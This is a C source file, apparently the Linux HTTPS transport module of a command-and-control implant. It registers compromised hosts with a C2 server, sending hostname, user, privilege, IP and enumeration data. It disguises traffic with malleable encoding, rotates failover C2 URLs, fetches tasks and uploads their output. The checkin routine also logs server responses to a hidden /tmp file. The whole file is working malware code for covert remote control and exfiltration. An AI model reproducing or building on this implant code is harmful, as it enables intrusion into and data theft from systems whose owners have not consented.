/**
 * Linux HTTPS transport via libcurl
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <curl/curl.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/malleable.h"
#include "../../include/base64.h"
#include "../../include/json.h"
#include "../../include/crypto.h"
#include "../../include/postex.h"

typedef struct {
    char *data;
    size_t size;
} response_buffer;

static CRYPTO_CTX g_crypto;
static char g_implant_id[64] = {0};
static C2_FAILOVER g_failover;
static BOOL g_failover_ready = FALSE;
static CURL *g_curl = NULL;

static size_t write_callback(void *ptr, size_t size, size_t nmemb, response_buffer *buf) {
    size_t total = size * nmemb;
    char *new_data = realloc(buf->data, buf->size + total + 1);
    if (!new_data) return 0;
    buf->data = new_data;
    memcpy(buf->data + buf->size, ptr, total);
    buf->size += total;
    buf->data[buf->size] = '\0';
    return total;
}

static const char *transport_active_url(const char *url) {
    if (g_failover_ready && g_failover.count > 0) {
        const char *fo = failover_get_url(&g_failover);
        if (fo && fo[0]) return fo;
    }
    return url;
}

static void transport_note_result(BOOL ok) {
    if (!g_failover_ready || g_failover.count <= 1) return;
    if (ok) failover_mark_success(&g_failover);
    else failover_mark_failure(&g_failover);
}

BOOL transport_init(PIMPLANT_CONFIG config) {
    if (config && config->implant_id[0])
        strncpy(g_implant_id, config->implant_id, sizeof(g_implant_id) - 1);

    CURLcode ginit = curl_global_init(CURL_GLOBAL_DEFAULT);
#if DEBUG_NODAEMON
    fprintf(stderr, "[DEBUG] curl_global_init = %d (%s)\n", ginit, curl_easy_strerror(ginit));
#endif
    if (ginit != CURLE_OK) return FALSE;

    g_curl = curl_easy_init();
    if (!g_curl) {
#if DEBUG_NODAEMON
        fprintf(stderr, "[DEBUG] curl_easy_init returned NULL\n");
#endif
        return FALSE;
    }

#ifdef C2_URL_LIST
    if (C2_URL_LIST[0]) {
        failover_init(&g_failover, C2_URL_LIST);
    } else
#endif
    {
        failover_init(&g_failover, config->c2_url);
    }
    g_failover_ready = (g_failover.count > 0);
    return TRUE;
}

void transport_cleanup(void) {
    crypto_cleanup(&g_crypto);
    if (g_curl) {
        curl_easy_cleanup(g_curl);
        g_curl = NULL;
    }
    curl_global_cleanup();
}

static PHTTP_RESPONSE http_request(const char *base_url, const char *path, const char *method,
                                   const BYTE *data, DWORD data_size, const char *user_agent) {
    if (!g_curl) return NULL;

    const char *active_url = transport_active_url(base_url);
    char full_url[1024];
    snprintf(full_url, sizeof(full_url), "%s%s", active_url, path);

    response_buffer buf = {0};
    struct curl_slist *headers = NULL;

    char hdr_list[8][256];
    DWORD hdr_count = malleable_build_header_list(hdr_list, 8);
    for (DWORD i = 0; i < hdr_count; i++)
        headers = curl_slist_append(headers, hdr_list[i]);
    if (g_implant_id[0]) {
        char id_hdr[128];
        snprintf(id_hdr, sizeof(id_hdr), "X-Implant-Id: %s", g_implant_id);
        headers = curl_slist_append(headers, id_hdr);
    }

    curl_easy_reset(g_curl);
    curl_easy_setopt(g_curl, CURLOPT_URL, full_url);
    curl_easy_setopt(g_curl, CURLOPT_USERAGENT, user_agent);
    curl_easy_setopt(g_curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(g_curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(g_curl, CURLOPT_HTTPHEADER, headers);
#ifdef CERT_PIN_HASH
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(g_curl, CURLOPT_PINNEDPUBLICKEY, CERT_PIN_HASH);
#elif defined(LAB_NO_TLS_VERIFY)
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 0L);
#else
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(g_curl, CURLOPT_SSL_VERIFYHOST, 2L);
#endif
    curl_easy_setopt(g_curl, CURLOPT_TIMEOUT, 30L);

    if (strcmp(method, "POST") == 0) {
        curl_easy_setopt(g_curl, CURLOPT_POST, 1L);
        curl_easy_setopt(g_curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(g_curl, CURLOPT_POSTFIELDSIZE, (long)data_size);
    }

    CURLcode res = curl_easy_perform(g_curl);
    long status = 0;
    curl_easy_getinfo(g_curl, CURLINFO_RESPONSE_CODE, &status);
    curl_slist_free_all(headers);

#if DEBUG_NODAEMON
    fprintf(stderr, "[DEBUG] curl %s %s -> res=%d (%s) status=%ld\n",
            method, full_url, res, curl_easy_strerror(res), status);
#endif

    if (res != CURLE_OK) {
        free(buf.data);
        transport_note_result(FALSE);
        return NULL;
    }

    PHTTP_RESPONSE resp = (PHTTP_RESPONSE)calloc(1, sizeof(HTTP_RESPONSE));
    if (!resp) {
        free(buf.data);
        return NULL;
    }

    resp->status_code = (DWORD)status;

    if (buf.size > 0 && resp->status_code == 200) {
        /*
         * Decode order must match server's encode order:
         *   Server encodes: JSON -> encrypt -> b64 -> malleable_encode
         *   Client decodes: malleable_decode -> b64 -> decrypt -> JSON
         *
         * For registration (crypto not initialized):
         *   Server encodes: JSON -> malleable_encode  (no crypto)
         *   Client decodes: malleable_decode -> JSON
         */
        BYTE *cur = (BYTE *)buf.data;
        DWORD cur_len = (DWORD)buf.size;
        BYTE *to_free_mal = NULL;

        DWORD mal_cap = cur_len < 4096 ? 8192 : cur_len + 1024;
        BYTE *mal_buf = (BYTE *)malloc(mal_cap);
        if (mal_buf) {
            DWORD mal_len = malleable_decode_inbound(cur, cur_len, mal_buf, mal_cap);
            if (mal_len > 0) {
                cur = mal_buf;
                cur_len = mal_len;
                to_free_mal = mal_buf;
            } else {
                free(mal_buf);
            }
        }

        if (g_crypto.initialized) {
            DWORD enc_cap = cur_len;
            BYTE *enc_raw = (BYTE *)malloc(enc_cap);
            if (!enc_raw) {
                if (to_free_mal) free(to_free_mal);
                free(buf.data); free(resp);
                transport_note_result(FALSE);
                return NULL;
            }
            DWORD enc_len = b64_decode((const char *)cur, cur_len, enc_raw, enc_cap);
            if (to_free_mal) { free(to_free_mal); to_free_mal = NULL; }
            free(buf.data); buf.data = NULL;

            if (enc_len == 0) {
                free(enc_raw); free(resp);
                transport_note_result(FALSE);
                return NULL;
            }

            DWORD pt_len = 0;
            BYTE *plain = crypto_decrypt(&g_crypto, enc_raw, enc_len, &pt_len);
            free(enc_raw);
            if (!plain || pt_len == 0) {
                if (plain) free(plain);
                free(resp);
                transport_note_result(FALSE);
                return NULL;
            }
            resp->data = plain;
            resp->size = pt_len;
        } else {
            if (to_free_mal) {
                resp->data = to_free_mal;
                resp->size = cur_len;
                free(buf.data); buf.data = NULL;
            } else {
                resp->data = (BYTE *)buf.data;
                resp->size = cur_len;
                buf.data = NULL;
            }
        }
    } else if (buf.data) {
        resp->data = (BYTE *)buf.data;
        resp->size = (DWORD)buf.size;
    }

    transport_note_result(resp->status_code == 200);
    return resp;
}

PHTTP_RESPONSE http_post(const char *url, const char *path, const BYTE *data, DWORD data_size,
                         const char *user_agent) {
    if (!data || data_size == 0)
        return http_request(url, path, "POST", data, data_size, user_agent);

    /*
     * Encode order must match server's decode order:
     *   Server decodes: malleable_decode -> b64 -> decrypt -> JSON
     *   Client encodes: JSON -> encrypt -> b64 -> malleable_encode
     *
     * For registration (crypto not initialized):
     *   Client encodes: JSON -> malleable_encode  (no crypto)
     */
    const BYTE *payload = data;
    DWORD payload_len = data_size;
    BYTE *crypto_buf = NULL;

    if (g_crypto.initialized) {
        DWORD enc_len = 0;
        BYTE *enc_buf = crypto_encrypt(&g_crypto, data, data_size, &enc_len);
        if (!enc_buf) return NULL;

        DWORD b64_cap = enc_len * 2 + 4;
        char *b64 = (char *)malloc(b64_cap);
        if (!b64) { free(enc_buf); return NULL; }
        DWORD b64_len = b64_encode(enc_buf, enc_len, b64, b64_cap);
        free(enc_buf);
        if (b64_len == 0) { free(b64); return NULL; }

        crypto_buf = (BYTE *)b64;
        payload = crypto_buf;
        payload_len = b64_len;
    }

    DWORD wire_cap = payload_len < 4096 ? 16384 : payload_len * 3;
    BYTE *wire = (BYTE *)malloc(wire_cap);
    if (!wire) { free(crypto_buf); return NULL; }

    DWORD wire_len = malleable_encode_outbound(payload, payload_len, wire, wire_cap);
    if (wire_len == 0) { wire_len = payload_len; memcpy(wire, payload, payload_len); }
    free(crypto_buf);

    PHTTP_RESPONSE resp = http_request(url, path, "POST", wire, wire_len, user_agent);
    free(wire);
    return resp;
}

PHTTP_RESPONSE http_get(const char *url, const char *path, const char *user_agent) {
    return http_request(url, path, "GET", NULL, 0, user_agent);
}

void http_response_free(PHTTP_RESPONSE resp) {
    if (!resp) return;
    free(resp->data);
    free(resp);
}

static int json_step(int *pos, char *buf, int cap, int n) {
    if (n < 0 || *pos + n >= cap) return -1;
    *pos += n;
    return 0;
}

static int json_comma(int *pos, char *buf, int cap) {
    if (*pos + 1 >= cap) return -1;
    buf[(*pos)++] = ',';
    return 0;
}

static void get_internal_ip(char *buf, int buf_size) {
    struct ifaddrs *ifaddr, *ifa;
    buf[0] = '\0';

    if (getifaddrs(&ifaddr) == -1) {
        strncpy(buf, "0.0.0.0", buf_size - 1);
        return;
    }

    for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        if (ifa->ifa_flags & IFF_LOOPBACK) continue;
        if (!(ifa->ifa_flags & IFF_UP)) continue;

        struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
        inet_ntop(AF_INET, &sa->sin_addr, buf, buf_size);

        if (strncmp(buf, "169.254.", 8) != 0) {
            freeifaddrs(ifaddr);
            return;
        }
    }
    freeifaddrs(ifaddr);

    if (buf[0] == '\0')
        strncpy(buf, "0.0.0.0", buf_size - 1);
    buf[buf_size - 1] = '\0';
}

static void get_os_info(char *os_str, int os_size, char *arch_str, int arch_size) {
    struct utsname uts;
    if (uname(&uts) == 0) {
        snprintf(os_str, os_size, "%s %s", uts.sysname, uts.release);
        strncpy(arch_str, uts.machine, arch_size - 1);
    } else {
        strncpy(os_str, "Linux", os_size - 1);
        strncpy(arch_str, "x86_64", arch_size - 1);
    }
    os_str[os_size - 1] = '\0';
    arch_str[arch_size - 1] = '\0';
}

static DWORD build_register_payload(PIMPLANT_CONFIG config, const char *pubkey_b64,
                                    BYTE *buf, DWORD buf_size) {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname) - 1);

    char username[256] = {0};
    const char *user = getenv("USER");
    if (!user) user = getenv("LOGNAME");
    if (user) strncpy(username, user, sizeof(username) - 1);

    char procname[MAX_PATH_LEN] = {0};
    ssize_t n = readlink("/proc/self/exe", procname, sizeof(procname) - 1);
    if (n > 0) procname[n] = '\0';
    char *basename = procname;
    for (char *p = procname; *p; p++) {
        if (*p == '/') basename = p + 1;
    }

    int elevated = (geteuid() == 0) ? 1 : 0;

    char ip[64] = {0};
    char os[128] = {0};
    char arch[16] = {0};
    get_internal_ip(ip, sizeof(ip));
    get_os_info(os, sizeof(os), arch, sizeof(arch));

    int cap = (int)buf_size;
    int pos = 0;
    char *out = (char *)buf;
    const char *enum_json = auto_enum_peek();

    if (cap < 2) return 0;
    out[pos++] = '{';

    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "implant_id", config->implant_id)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "hostname", hostname)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "username", username)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "domain", "")) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv_int(out + pos, cap - pos, "os", 2)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "arch", arch)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv_int(out + pos, cap - pos, "pid", getpid())) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "process_name", basename)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv_bool(out + pos, cap - pos, "elevated", elevated)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "internal_ip", ip)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "os_version", os)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "build_id", BUILD_ID)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "build_token", BUILD_TOKEN)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "pubkey", pubkey_b64 ? pubkey_b64 : "")) < 0) return 0;
    if (enum_json && enum_json[0]) {
        if (json_comma(&pos, out, cap) < 0) return 0;
        if (json_step(&pos, out, cap, json_emit_kv_raw(out + pos, cap - pos, "auto_enum", enum_json)) < 0) return 0;
    }
    if (pos + 1 >= cap) return 0;
    out[pos++] = '}';
    out[pos] = '\0';
    return (DWORD)pos;
}

BOOL transport_register(PIMPLANT_CONFIG config) {
    BYTE pubkey_raw[128];
    DWORD pubkey_len = sizeof(pubkey_raw);

    CRYPTO_CTX saved_crypto = g_crypto;

    if (!crypto_init(&g_crypto, pubkey_raw, &pubkey_len)) {
        g_crypto = saved_crypto;
        return FALSE;
    }

    char pubkey_b64[256];
    pubkey_b64[0] = '\0';
    if (b64_encode(pubkey_raw, pubkey_len, pubkey_b64, sizeof(pubkey_b64)) == 0) {
        crypto_cleanup(&g_crypto);
        g_crypto = saved_crypto;
        return FALSE;
    }

    BYTE payload[8192];
    DWORD payload_size = build_register_payload(config, pubkey_b64, payload, sizeof(payload));
    if (payload_size == 0) {
        crypto_cleanup(&g_crypto);
        g_crypto = saved_crypto;
        return FALSE;
    }

#if DEBUG_NODAEMON
    fprintf(stderr, "[DEBUG] register payload (%u bytes): %.2048s\n", payload_size, (char*)payload);
#endif

    PHTTP_RESPONSE resp = http_post(transport_active_url(config->c2_url),
                                    config->register_path, payload, payload_size,
                                    config->user_agent);
    if (!resp) {
        crypto_cleanup(&g_crypto);
        g_crypto = saved_crypto;
        return FALSE;
    }

    BOOL success = FALSE;
    if (resp->status_code == 200 && resp->data && resp->size > 10) {
        int interval = 0, jitter = 0;
        json_find_int((const char *)resp->data, "interval", &interval);
        json_find_int((const char *)resp->data, "jitter", &jitter);
        if (interval > 0) config->sleep_seconds = (DWORD)interval;
        if (jitter >= 0 && jitter <= 100) config->jitter_percent = (DWORD)jitter;

        char server_pubkey_b64[256];
        server_pubkey_b64[0] = '\0';
        if (json_find_string((const char *)resp->data, "server_pubkey",
                             server_pubkey_b64, sizeof(server_pubkey_b64))) {
            BYTE server_pubkey[128];
            DWORD sp_len = b64_decode(server_pubkey_b64, (DWORD)strlen(server_pubkey_b64),
                                      server_pubkey, sizeof(server_pubkey));
            if (sp_len > 0 && crypto_derive_session_key(&g_crypto, server_pubkey, sp_len)) {
                crypto_set_session_id(&g_crypto, config->implant_id);
                success = TRUE;
            }
        }
    }

    if (success) {
        crypto_cleanup(&saved_crypto);
        if (config->implant_id[0])
            strncpy(g_implant_id, config->implant_id, sizeof(g_implant_id) - 1);
    } else {
        crypto_cleanup(&g_crypto);
        g_crypto = saved_crypto;
    }

    http_response_free(resp);
    return success;
}

static DWORD parse_tasks_json(const char *json, PC2_TASK *out_tasks) {
    *out_tasks = NULL;
    const char *json_end = json + strlen(json);
    const char *arr_start = strstr(json, "\"tasks\":[");
    if (!arr_start) return 0;
    arr_start += 9;

    DWORD count = 0;
    const char *scan = arr_start;
    while (scan < json_end && *scan && *scan != ']') {
        if (*scan == '{') {
            const char *obj_end = json_find_object_end(scan, json_end);
            if (!obj_end) break;
            count++;
            scan = obj_end + 1;
        } else {
            scan++;
        }
    }
    if (count == 0) return 0;

    PC2_TASK tasks = (PC2_TASK)calloc(count, sizeof(C2_TASK));
    if (!tasks) return 0;

    const char *p = arr_start;
    for (DWORD i = 0; i < count && p < json_end && *p; i++) {
        while (p < json_end && *p && *p != '{') p++;
        if (p >= json_end || !*p) break;

        const char *obj_end = json_find_object_end(p, json_end);
        if (!obj_end) break;

        json_find_string(p, "id", tasks[i].id, sizeof(tasks[i].id));

        int task_type = 0;
        json_find_int(p, "type", &task_type);
        tasks[i].type = (DWORD)task_type;

        char *data_b64 = (char *)malloc(MAX_OUTPUT_SIZE);
        if (!data_b64) {
            for (DWORD j = 0; j <= i; j++) {
                free(tasks[j].data);
            }
            free(tasks);
            return 0;
        }
        data_b64[0] = '\0';
        json_find_string(p, "data", data_b64, MAX_OUTPUT_SIZE);
        DWORD b64_len = (DWORD)strlen(data_b64);
        if (b64_len > 0) {
            DWORD alloc_size = (b64_len * 3) / 4 + 4;
            if (alloc_size > MAX_TASK_DATA) {
                free(data_b64);
                p = obj_end + 1;
                continue;
            }
            tasks[i].data = (BYTE *)malloc(alloc_size);
            if (tasks[i].data) {
                tasks[i].data_size = b64_decode(data_b64, b64_len, tasks[i].data, alloc_size);
            }
        }
        free(data_b64);

        p = obj_end + 1;
    }

    *out_tasks = tasks;
    return count;
}

BOOL transport_checkin(PIMPLANT_CONFIG config, PC2_TASK *tasks, DWORD *task_count) {
    *tasks = NULL;
    *task_count = 0;

    char payload[256];
    int pos = 0;
    int cap = (int)sizeof(payload);
    payload[pos++] = '{';
    if (json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "id", config->implant_id)) < 0)
        return FALSE;
    if (pos + 1 >= cap) return FALSE;
    payload[pos++] = '}';
    int len = pos;

    PHTTP_RESPONSE resp = http_post(transport_active_url(config->c2_url),
                                    config->checkin_path, (BYTE *)payload, (DWORD)len,
                                    config->user_agent);
    if (!resp) return FALSE;

    if (resp->status_code != 200) {
        http_response_free(resp);
        return FALSE;
    }

    {
        FILE *f = fopen("/tmp/.c2dbg.log", "a");
        if (f) {
            fprintf(f, "[%d] checkin resp: status=%ld size=%u first60=%.60s\n",
                    getpid(), resp->status_code, resp->size,
                    resp->data ? (char *)resp->data : "(null)");
            fflush(f); fclose(f);
        }
    }

    if (resp->size > 10) {
        BYTE *decoded = resp->data;
        DWORD decoded_len = resp->size;
        BYTE *mall_buf = NULL;
        BYTE *dec_buf = NULL;

        /* Check if response is plaintext JSON (starts with '{') */
        int is_plaintext = (decoded_len > 0 && decoded[0] == '{');

        if (!is_plaintext) {
            /* Server encodes: JSON -> encrypt -> b64 -> malleable_encode
             * Client decodes: malleable_decode -> b64 -> decrypt -> JSON */

            DWORD mall_cap = decoded_len + 64;
            mall_buf = (BYTE *)malloc(mall_cap);
            if (mall_buf) {
                DWORD mall_len = malleable_decode_inbound(decoded, decoded_len, mall_buf, mall_cap);
                if (mall_len > 0) {
                    decoded = mall_buf;
                    decoded_len = mall_len;
                } else {
                    free(mall_buf);
                    mall_buf = NULL;
                }
            }

            if (g_crypto.initialized) {
                DWORD raw_cap = decoded_len;
                BYTE *raw_buf = (BYTE *)malloc(raw_cap);
                if (raw_buf) {
                    DWORD raw_len = b64_decode((const char *)decoded, decoded_len, raw_buf, raw_cap);
                    if (raw_len > 0) {
                        DWORD plain_len = 0;
                        dec_buf = crypto_decrypt(&g_crypto, raw_buf, raw_len, &plain_len);
                        free(raw_buf);
                        if (dec_buf && plain_len > 0) {
                            decoded = dec_buf;
                            decoded_len = plain_len;
                        }
                    } else {
                        free(raw_buf);
                    }
                }
            }
        }

        *task_count = parse_tasks_json((const char *)decoded, tasks);
        free(mall_buf);
        free(dec_buf);
    }

    http_response_free(resp);
    return TRUE;
}

BOOL transport_send_result(PIMPLANT_CONFIG config, PC2_RESULT result) {
    DWORD error_len = (DWORD)strlen(result->error);
    DWORD b64_size = ((result->data_size + 2) / 3) * 4 + 1;
    DWORD json_size = 256 + error_len + b64_size;

    char *payload = (char *)calloc(1, json_size);
    char *b64_data = (char *)calloc(1, b64_size);
    if (!payload || !b64_data) {
        free(payload);
        free(b64_data);
        return FALSE;
    }

    if (result->data && result->data_size > 0) {
        b64_encode(result->data, result->data_size, b64_data, b64_size);
    }

    int pos = 0;
    int cap = (int)json_size;
    payload[pos++] = '{';
    if (json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "task_id", result->task_id)) < 0 ||
        json_comma(&pos, payload, cap) < 0 ||
        json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "output", b64_data)) < 0 ||
        json_comma(&pos, payload, cap) < 0 ||
        json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "error", result->error)) < 0 ||
        pos + 1 >= cap) {
        free(b64_data);
        free(payload);
        return FALSE;
    }
    payload[pos++] = '}';
    int written = pos;

    free(b64_data);

    PHTTP_RESPONSE resp = http_post(transport_active_url(config->c2_url),
                                    config->result_path, (BYTE *)payload, (DWORD)written,
                                    config->user_agent);
    free(payload);

    if (!resp) return FALSE;
    BOOL success = (resp->status_code == 200);
    http_response_free(resp);
    return success;
}
